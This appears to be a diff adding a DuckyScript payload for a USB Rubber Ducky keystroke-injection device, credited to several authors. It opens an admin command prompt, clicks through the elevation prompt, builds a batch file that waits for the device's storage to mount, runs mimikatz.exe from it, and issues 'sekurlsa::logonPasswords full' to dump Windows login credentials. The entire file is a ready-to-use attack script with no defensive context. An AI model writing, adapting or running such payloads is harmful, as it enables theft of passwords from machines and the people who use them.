@@ -1,0 +1,62 @@
+REM Author: shutin who just tied two other authors together: 
+REM overwraith for the exe running stuff and redmeatuk who brought mimikatz to the party
+REM Name: Runmimikatz.txt
+DEFAULT_DELAY 75
+DELAY 3000
+REM get a cmd prompt this way because it's admin and we need that for mimikatz
+CONTROL ESCAPE
+DELAY 1000
+STRING cmd
+DELAY 1000
+REM the admin part booyah
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 300
+ENTER
+
+REM Change directories because System32 appears to be protected. 
+STRING CD %TEMP%
+ENTER
+
+REM Make batch file that waits for SD card to mount. 
+REM Delete batch file if already exists
+STRING erase /Q DuckyWait.bat
+ENTER
+STRING copy con DuckyWait.bat
+ENTER
+REM DuckyWait.bat contents
+STRING :while1
+ENTER
+STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set myd=%%d
+ENTER
+STRING if Exist %myd% (
+ENTER
+STRING goto break
+ENTER
+STRING )
+ENTER
+STRING timeout /t 30
+ENTER
+STRING goto while1
+ENTER
+STRING :break
+ENTER
+REM 
+REM FINALLY ACTUALLY RUN AN EXE 
+STRING START %myd%\mimikatz.exe
+ENTER
+CONTROL z
+ENTER
+STRING DuckyWait.bat
+ENTER
+DELAY 1000
+ENTER
+DELAY 3000
+STRING privilege::debug
+DELAY 300
+ENTER
+DELAY 1000
+STRING sekurlsa::logonPasswords full
+DELAY 300
+ENTER
